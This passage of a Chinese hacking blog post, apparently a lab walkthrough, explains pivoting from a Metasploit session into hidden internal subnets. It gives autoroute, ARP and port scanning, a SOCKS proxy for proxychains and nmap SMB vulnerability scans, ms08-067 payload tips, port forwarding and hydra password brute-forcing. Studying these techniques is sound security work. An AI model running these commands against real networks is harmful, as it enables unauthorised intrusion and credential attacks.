7.7.0<hanla></hanla>和<hanla></hanla>8.8.8.0<hanla></hanla>这两个隐藏的网段<br><hanla></hanla>6)<hanla></hanla>目标是准备通过<hanla></hanla>RD<hanla></hanla>来渗透内网中<hanla></hanla>7.7.7.0<hanla></hanla>和<hanla></hanla>8.8.8.0<hanla></hanla>两个隐藏的网段  </p>
+<p>这里我还是用上面那个环境一样的其实<br><hanla></hanla>先用<hanla></hanla>msf<hanla></hanla>控制第一台主机<br>通过命令获取目标机器有两卡网卡，继续渗透另一块网卡所在的网络<br><hanla></hanla>shell<hanla></hanla>然后<hanla></hanla>ipconfig<hanla></hanla>看一下<br><hanla></hanla>可以看见这里除了<hanla></hanla>43<hanla></hanla>网段还有一个 5.0<hanla></hanla>网段  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7aGS"><img src="https://s3.jpg.cm/2021/10/10/Iw7aGS.png" alt="Iw7aGS.png"></a></p>
+<p>chcp 65001 解决乱码<br><hanla></hanla>为了使<hanla></hanla>msf<hanla></hanla>中模块更好的扫描<hanla></hanla>7.0<hanla></hanla>网络我们给<hanla></hanla>shell<hanla></hanla>添加路由<br><hanla></hanla>run autoroute -s 192.168.5.0/24  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7icW"><img src="https://s3.jpg.cm/2021/10/10/Iw7icW.png" alt="Iw7icW.png"></a></p>
+<p><hanla></hanla>然后开始扫描<hanla></hanla>192.168.5.0<hanla></hanla>网段，<br>run post/windows/gather/arp_scanner RHOSTS=192.168.5.0/24</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7xv2"><img src="https://s3.jpg.cm/2021/10/10/Iw7xv2.png" alt="Iw7xv2.png"></a></p>
+<p><hanla></hanla>所有<hanla></hanla>5.131j<hanla></hanla>就是我们的攻击目标<br><hanla></hanla>background<br>search portscan<br>use 5<br>set rhost 192.168.5.0/24<br>setg threads 50  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7DiH"><img src="https://s3.jpg.cm/2021/10/10/Iw7DiH.png" alt="Iw7DiH.png"></a></p>
+<p><hanla></hanla>如果想用<hanla></hanla>nmap<hanla></hanla>扫<br><hanla></hanla>search socks4<br>use 0<br>sessions -l<br>options<br>set srvhost 127.0.0.1<br>set srvport 1080<br>run<br>vi /etc/proxychains.conf  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7OlL"><img src="https://s3.jpg.cm/2021/10/10/Iw7OlL.png" alt="Iw7OlL.png"></a></p>
+<p>proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 –script=smb-vuln-ms* 192.168.5.131</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwQLWO"><img src="https://s3.jpg.cm/2021/10/10/IwQLWO.png" alt="IwQLWO.png"></a></p>
+<p><hanla></hanla>不知道为什么我<hanla></hanla>kali<hanla></hanla>里面的<hanla></hanla>namp<hanla></hanla>没扫出漏洞命令一模一样</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwQGhU"><img src="https://s3.jpg.cm/2021/10/10/IwQGhU.png" alt="IwQGhU.png"></a></p>
+<p>如果存在就可以秒他<br><hanla></hanla>利用<hanla></hanla>ms08-067<hanla></hanla>的时候<br><hanla></hanla>使用<hanla></hanla>set payload 要使用<hanla></hanla>bind_tcp<hanla></hanla>直连  不能使用<hanla></hanla>reverse_tcp<hanla></hanla>反弹<br>这里我没能成功</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7Zsf"><img src="https://s3.jpg.cm/2021/10/10/Iw7Zsf.png" alt="Iw7Zsf.png"></a></p>
+<p>如果成功就能对下一个目标进行收集继续攻击</p>
+<h4 id="将远程目标机的端口转发到本地攻击"><a href="#将远程目标机的端口转发到本地攻击" class="headerlink" title="将远程目标机的端口转发到本地攻击"></a>将远程目标机的端口转发到本地攻击</h4><p><hanla></hanla>portfwd add -L 192.168.0.199 -l 99 -p 99 -r 7.7.7.20</p>
+<h4 id="通过socket代理爆破远程目标机器"><a href="#通过socket代理爆破远程目标机器" class="headerlink" title="通过socket代理爆破远程目标机器"></a><hanla></hanla>通过<hanla></hanla>socket<hanla></hanla>代理爆破远程目标机器</h4><p><hanla></hanla>proxychains hydra -l administrator -P pass.txt telnet://7.7.7.20</p>
+<h4 id="远程登陆目标服务器"><a href="#远程登陆目标服务器" class="headerlink" title="远程登陆目标服务器"></a>远程登陆目标服务器</h4><p><hanla></hanla>proxychains ssh <a href="mailto:admin@7.7.7.20">admin@7.7.7.20</a></p>
+<p>proxychains rdesktop 7.7.7.20</p>
+<h4 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h4><p><hanla></hanla>示例：要将最初瞄准端口<hanla></hanla>TCP-80<hanla></hanla>的传入流量转移到另一个<hanla></hanla>TCP<hanla></hanla>端口，<br><hanla></hanla>例如<hanla></hanla>8080，请执行以下操作：</p>
+<p>c:&gt; divertTCPconn 80 8080</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
